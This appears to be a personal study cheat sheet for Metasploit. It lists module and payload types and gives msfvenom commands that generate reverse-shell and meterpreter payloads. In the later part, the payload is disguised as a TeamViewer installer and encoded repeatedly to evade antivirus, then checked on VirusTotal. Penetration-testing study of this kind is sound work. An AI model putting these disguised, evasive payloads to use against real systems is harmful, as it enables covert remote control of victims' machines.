# Metasploit
Find the metasploit modules in: `/usr/share/metasploit-framework/modules`
Plugins: `/usr/share/metasploit-framework/plugins/`
Scripts: `/usr/share/metasploit-framework/scripts/`

To start msfconsole without banner, use `-q`

Can use for:

    Enumeration
    Preparation
    Exploitation
    Privilege Escalation
    Post-Exploitation


Types of modules:
`Auxiliary` 	Scanning, fuzzing, sniffing, and admin capabilities. Offer extra assistance and functionality.
`Encoders` 	Ensure that payloads are intact to their destination.
`Exploits` 	Defined as modules that exploit a vulnerability that will allow for the payload delivery.
`NOPs` 	(No Operation code) Keep the payload sizes consistent across exploit attempts.
`Payloads` 	Code runs remotely and calls back to the attacker machine to establish a connection (or shell).
`Plugins` 	Additional scripts can be integrated within an assessment with msfconsole and coexist.
`Post` 	Wide array of modules to gather information, pivot deeper, etc.

### Gotta love `eternalRomance`
For example, we can try to find the EternalRomance exploit for older Windows operating systems. This could look something like this:

Don't forget the command `info`

`setg` to set a permanent until program is restarted

`setg rhosts <host>`

we can combine payloads with: [GentilKiwi's Mimikatz Plugin](https://github.com/gentilkiwi/mimikatz) 

We can use `grep` when searching for payloads. `grep meterpreter grep reverse_tcp show payloads`

`help` is available in metasploit

### Payload types:
    generic/custom 	Generic listener, multi-use
    generic/shell_bind_tcp 	Generic listener, multi-use, normal shell, TCP connection binding
    generic/shell_reverse_tcp 	Generic listener, multi-use, normal shell, reverse TCP connection
    windows/x64/exec 	Executes an arbitrary command (Windows x64)
    windows/x64/loadlibrary 	Loads an arbitrary x64 library path
    windows/x64/messagebox 	Spawns a dialog via MessageBox using a customizable title, text & icon
    windows/x64/shell_reverse_tcp 	Normal shell, single payload, reverse TCP connection
    windows/x64/shell/reverse_tcp 	Normal shell, stager + stage, reverse TCP connection
    windows/x64/shell/bind_ipv6_tcp 	Normal shell, stager + stage, IPv6 Bind TCP stager
    windows/x64/meterpreter/$ 	Meterpreter payload + varieties above
    windows/x64/powershell/$ 	Interactive PowerShell sessions + varieties above
    windows/x64/vncinject/$ 	VNC Server (Reflective Injection) + varieties above

The different encoders:
x64 	x86 	sparc 	ppc 	mips

We will always need to encode our payload according to our target architecture
`msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai`
or with `msvenom`
without encoding:
`msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl`

w. encoding:
`msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai`

read more about [shikata_ga_nai encoding](https://hatching.io/blog/metasploit-payloads2/)

we can select encoders with: `show encoders` & `set encoders`

`msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe`

If we were to encode an executable payload only once with SGN, it would most likely be detected by most antiviruses today. Let's delve into that for a moment. Picking up msfvenom, the subscript of the Framework that deals with payload generation and Encoding schemes, we have the following input:
One better option would be to try running it through multiple iterations of the same Encoding scheme:
`msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe`

msf-virustotal that can use with an API key to analyze our payloads. However this requires free registration on virustotal. 
`msf-virustotal -k <API key> -f TeamViewerInstall.exe`
